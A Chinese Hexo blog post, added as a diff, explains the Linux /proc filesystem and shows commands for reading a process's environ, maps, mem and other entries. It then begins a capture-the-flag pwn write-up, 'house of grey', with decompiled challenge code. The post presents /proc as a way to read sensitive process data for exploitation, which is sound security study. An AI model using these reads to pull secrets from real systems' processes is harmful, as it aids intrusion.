@@ -1,0 +1,784 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"ikoct.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="Linux 虚拟文件系统除了存放在物理内存中的文件外Linux还提供了一系列虚拟文件系统来访问系统资源 其中&#x2F;proc可以访问一个进程的所有信息 可以用来读取一些敏感程序信息 使用&#x2F;proc&#x2F;&lt;pid&gt;&#x2F;来访问pid所指进程的资源 详细信息参考Linux内核文档">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux中的虚拟文件">
+<meta property="og:url" content="https://ikoct.com/2025/03/03/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6/">
+<meta property="og:site_name" content="Ikoct的饮冰室">
+<meta property="og:description" content="Linux 虚拟文件系统除了存放在物理内存中的文件外Linux还提供了一系列虚拟文件系统来访问系统资源 其中&#x2F;proc可以访问一个进程的所有信息 可以用来读取一些敏感程序信息 使用&#x2F;proc&#x2F;&lt;pid&gt;&#x2F;来访问pid所指进程的资源 详细信息参考Linux内核文档">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F03%2F20250303-112705.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F03%2F20250303-114528.png">
+<meta property="article:published_time" content="2025-03-03T05:26:45.000Z">
+<meta property="article:modified_time" content="2025-03-03T05:26:45.445Z">
+<meta property="article:author" content="1K0CT B14s">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F03%2F20250303-112705.png">
+
+<link rel="canonical" href="https://ikoct.com/2025/03/03/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Linux中的虚拟文件 | Ikoct的饮冰室</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ikoct的饮冰室</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">你愿意和我学一辈子二进制吗?</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ikoct.com/2025/03/03/Linux%E4%B8%AD%E7%9A%84%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/myavatar.gif">
+      <meta itemprop="name" content="1K0CT B14s">
+      <meta itemprop="description" content="残りの人生、私にくれませんか？">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ikoct的饮冰室">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Linux中的虚拟文件
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-03 13:26:45" itemprop="dateCreated datePublished" datetime="2025-03-03T13:26:45+08:00">2025-03-03</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/" itemprop="url" rel="index"><span itemprop="name">二进制</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>10k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>9 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="Linux-虚拟文件系统"><a href="#Linux-虚拟文件系统" class="headerlink" title="Linux 虚拟文件系统"></a>Linux 虚拟文件系统</h1><p>除了存放在物理内存中的文件外Linux还提供了一系列虚拟文件系统来访问系统资源 其中<code>/proc</code>可以访问一个进程的所有信息 可以用来读取一些敏感程序信息 使用<code>/proc/&lt;pid&gt;/</code>来访问pid所指进程的资源 详细信息参考<a target="_blank" rel="noopener" href="https://docs.kernel.org/filesystems/proc.html">Linux内核文档</a></p>
+<span id="more"></span>
+
+<h2 id="各个子文件"><a href="#各个子文件" class="headerlink" title="各个子文件"></a>各个子文件</h2><table>
+<thead>
+<tr>
+<th align="left">File</th>
+<th align="left">Content</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">clear_refs</td>
+<td align="left">Clears page referenced bits shown in smaps output</td>
+</tr>
+<tr>
+<td align="left">cmdline</td>
+<td align="left">Command line arguments</td>
+</tr>
+<tr>
+<td align="left">cpu</td>
+<td align="left">Current and last cpu in which it was executed (2.4)(smp)</td>
+</tr>
+<tr>
+<td align="left">cwd</td>
+<td align="left">Link to the current working directory</td>
+</tr>
+<tr>
+<td align="left">environ</td>
+<td align="left">Values of environment variables</td>
+</tr>
+<tr>
+<td align="left">exe</td>
+<td align="left">Link to the executable of this process</td>
+</tr>
+<tr>
+<td align="left">fd</td>
+<td align="left">Directory, which contains all file descriptors</td>
+</tr>
+<tr>
+<td align="left">maps</td>
+<td align="left">Memory maps to executables and library files (2.4)</td>
+</tr>
+<tr>
+<td align="left">mem</td>
+<td align="left">Memory held by this process</td>
+</tr>
+<tr>
+<td align="left">root</td>
+<td align="left">Link to the root directory of this process</td>
+</tr>
+<tr>
+<td align="left">stat</td>
+<td align="left">Process status</td>
+</tr>
+<tr>
+<td align="left">statm</td>
+<td align="left">Process memory status information</td>
+</tr>
+<tr>
+<td align="left">status</td>
+<td align="left">Process status in human readable form</td>
+</tr>
+<tr>
+<td align="left">wchan</td>
+<td align="left">Present with CONFIG_KALLSYMS&#x3D;y: it shows the kernel function symbol the task is blocked in - or “0” if not blocked.</td>
+</tr>
+<tr>
+<td align="left">pagemap</td>
+<td align="left">Page table</td>
+</tr>
+<tr>
+<td align="left">stack</td>
+<td align="left">Report full stack trace, enable via CONFIG_STACKTRACE</td>
+</tr>
+<tr>
+<td align="left">smaps</td>
+<td align="left">An extension based on maps, showing the memory consumption of each mapping and flags associated with it</td>
+</tr>
+<tr>
+<td align="left">smaps_rollup</td>
+<td align="left">Accumulated smaps stats for all mappings of the process. This can be derived from smaps, but is faster and more convenient</td>
+</tr>
+<tr>
+<td align="left">numa_maps</td>
+<td align="left">An extension based on maps, showing the memory locality and binding policy as well as mem usage (in pages) of each mapping.</td>
+</tr>
+</tbody></table>
+<h3 id="proc-self-cmdline"><a href="#proc-self-cmdline" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;cmdline"></a>&#x2F;proc&#x2F;self&#x2F;cmdline</h3><ul>
+<li><p><strong>作用</strong>:存储进程的命令行参数 以 <code>\0</code> 作为分隔符(不像 <code>ps aux</code> 那样以空格分隔) </p>
+</li>
+<li><p>查看方式:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/self/cmdline</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>如果当前进程是 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./myprogram arg1 arg2</span><br></pre></td></tr></table></figure>
+
+<p> 那么内容类似:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./myprogramarg1arg2</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="proc-self-environ"><a href="#proc-self-environ" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;environ"></a>&#x2F;proc&#x2F;self&#x2F;environ</h3><ul>
+<li><p><strong>作用</strong>:存储进程的环境变量 每个变量以 <code>\0</code> 作为分隔符 </p>
+</li>
+<li><p>查看方式:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/environ | <span class="built_in">tr</span> <span class="string">&#x27;\0&#x27;</span> <span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>示例输出:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin</span><br><span class="line">SHELL=/bin/bash</span><br><span class="line">USER=root</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="proc-self-exe"><a href="#proc-self-exe" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;exe"></a>&#x2F;proc&#x2F;self&#x2F;exe</h3><ul>
+<li><p><strong>作用</strong>:指向进程当前执行的可执行文件 </p>
+</li>
+<li><p>查看方式:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/self/exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>示例输出:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx 1 root root 0 Mar 3 10:00 /proc/self/exe -&gt; /usr/bin/ls</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>获取可执行路径:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">readlink</span> /proc/self/exe</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>输出示例:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/bash</span><br></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="proc-self-fd"><a href="#proc-self-fd" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;fd&#x2F;"></a>&#x2F;proc&#x2F;self&#x2F;fd&#x2F;</h3><ul>
+<li><p><strong>作用</strong>:存储当前进程打开的所有文件描述符(类似 <code>ls -l /proc/self/fd/</code>) </p>
+</li>
+<li><p>查看打开的文件:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l /proc/self/fd/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>示例输出:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">total 0</span><br><span class="line">lrwx------ 1 user user 64 Mar 3 10:00 0 -&gt; /dev/pts/1</span><br><span class="line">lrwx------ 1 user user 64 Mar 3 10:00 1 -&gt; /dev/pts/1</span><br><span class="line">lrwx------ 1 user user 64 Mar 3 10:00 2 -&gt; /dev/pts/1</span><br><span class="line">lr-x------ 1 user user 64 Mar 3 10:00 3 -&gt; /var/log/syslog</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>0</code> &#x3D; 标准输入(stdin)</p>
+</li>
+<li><p><code>1</code> &#x3D; 标准输出(stdout)</p>
+</li>
+<li><p><code>2</code> &#x3D; 标准错误(stderr)</p>
+</li>
+<li><p><code>3</code> 及以上 &#x3D; 进程打开的其他文件</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="proc-self-maps"><a href="#proc-self-maps" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;maps"></a>&#x2F;proc&#x2F;self&#x2F;maps</h3><ul>
+<li><p><strong>作用</strong>:显示当前进程的<strong>内存映射</strong> 包括代码段、堆、栈、动态库等 </p>
+</li>
+<li><p>查看方式:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/maps</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>示例输出:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">555555554000-555555556000 r-xp 00000000 08:01 123456 /usr/bin/myprogram</span><br><span class="line">555555756000-555555757000 rw-p 00002000 08:01 123456 /usr/bin/myprogram</span><br><span class="line">7ffff7dcf000-7ffff7df1000 r-xp 00000000 08:01 654321 /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0 [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0 [vdso]</span><br><span class="line">7fffffffde000-7ffffffff000 rw-p 00000000 00:00 0 [stack]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>主要映射区域:</p>
+<ul>
+<li><strong>可执行文件代码段</strong>(<code>r-xp</code>)</li>
+<li><strong>可执行文件数据段</strong>(<code>rw-p</code>)</li>
+<li><strong>共享库(如 libc.so.6)</strong></li>
+<li><strong>堆(heap)</strong></li>
+<li><strong>栈(stack)</strong></li>
+<li><strong><code>vdso</code>、<code>vvar</code> 等特殊段</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="proc-self-mem"><a href="#proc-self-mem" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;mem"></a>&#x2F;proc&#x2F;self&#x2F;mem</h3><ul>
+<li><p><strong>作用</strong>:映射当前进程的整个内存(可用 <code>lseek + read</code> 读取) </p>
+</li>
+<li><p>示例:读取特定地址:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = open(<span class="string">&quot;/proc/self/mem&quot;</span>, O_RDONLY);</span><br><span class="line">lseek(fd, (<span class="type">off_t</span>)<span class="number">0x555555554000</span>, SEEK_SET);</span><br><span class="line">read(fd, buffer, <span class="keyword">sizeof</span>(buffer));</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>只能读取已映射区域 否则 <code>read()</code> 失败</strong></li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="proc-self-stat"><a href="#proc-self-stat" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;stat"></a>&#x2F;proc&#x2F;self&#x2F;stat</h3><ul>
+<li><p><strong>作用</strong>:进程的详细状态信息(数值型) </p>
+</li>
+<li><p>查看方式:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/stat</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>示例输出:</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1234</span> <span class="string">(myprogram)</span> <span class="string">R</span> <span class="number">567</span> <span class="number">567</span> <span class="number">567</span> <span class="number">0</span> <span class="number">-1</span> <span class="number">4194560</span> <span class="number">250</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">20</span> <span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">12345678</span> <span class="number">12345678</span> <span class="number">1000 </span><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">18446744073709551615</span> <span class="number">4194304</span> <span class="number">1234 </span><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">17</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>第 1 项:PID</p>
+</li>
+<li><p>第 2 项:进程名</p>
+</li>
+<li><p>第 3 项:进程状态(<code>R</code> &#x3D; 运行 <code>S</code> &#x3D; 睡眠)</p>
+</li>
+<li><p>其他信息如父进程 PID、优先级、进程时间等</p>
+</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="proc-self-status"><a href="#proc-self-status" class="headerlink" title="&#x2F;proc&#x2F;self&#x2F;status"></a>&#x2F;proc&#x2F;self&#x2F;status</h3><ul>
+<li><p><strong>作用</strong>:与 <code>stat</code> 类似 但更可读 </p>
+</li>
+<li><p>查看方式:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/self/status</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>示例:</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Name:   <span class="built_in">cat</span></span><br><span class="line">Umask:  0022</span><br><span class="line">State:  R (running)</span><br><span class="line">Tgid:   107428</span><br><span class="line">Ngid:   0</span><br><span class="line">Pid:    107428</span><br><span class="line">PPid:   64836</span><br><span class="line">TracerPid:      0</span><br><span class="line">Uid:    1000    1000    1000    1000</span><br><span class="line">Gid:    1000    1000    1000    1000</span><br><span class="line">FDSize: 64</span><br><span class="line">Groups: 4 20 24 25 27 29 30 44 46 100 101 113 116 129 136 1000 </span><br><span class="line">NStgid: 107428</span><br><span class="line">NSpid:  107428</span><br><span class="line">NSpgid: 107428</span><br><span class="line">NSsid:  64836</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>包含进程名称、状态、PID、内存占用、线程数等信息</p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="应用举例"><a href="#应用举例" class="headerlink" title="应用举例"></a>应用举例</h2><h3 id="攻防世界-house-of-grey"><a href="#攻防世界-house-of-grey" class="headerlink" title="[攻防世界] house of grey"></a>[攻防世界] house of grey</h3><p>主函数:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [rsp+1Bh] [rbp-25h] BYREF</span></span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">__pid_t</span> pid; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  __int64 random; <span class="comment">// [rsp+28h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to my house! Enjoy yourself!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to help me build my room? Y/n?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="string">&#x27;y&#x27;</span> || buf == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    read(fd, &amp;random, <span class="number">8uLL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line">    random &amp;= <span class="number">0xFFFFF0</span>u;</span><br><span class="line">    v8 = (<span class="type">char</span> *)mmap(<span class="number">0LL</span>, <span class="number">0x10000000</span>uLL, <span class="number">3</span>, <span class="number">131106</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 == (<span class="type">char</span> *)<span class="number">-1LL</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;mmap&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pid = clone(fn, &amp;v8[random], <span class="number">256</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( pid == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;clone&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    waitpid(pid, &amp;stat_loc, <span class="number">0x80000000</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (stat_loc &amp; <span class="number">0x7F</span>) != <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nMaybe something wrong? Build failed!&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nBuild finished! Thanks a lot!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You don&#x27;t help me? OK, just get out of my hosue!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>初始化函数中设置了几个沙箱规则 <code>seccomp-tools</code>反汇编看一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2025%2F03%2F03%2F20250303-112705.png" alt="image-20250303112646766"></p>
+<p>禁掉了<code>execve</code> 意味着主线程不可能get shell</p>
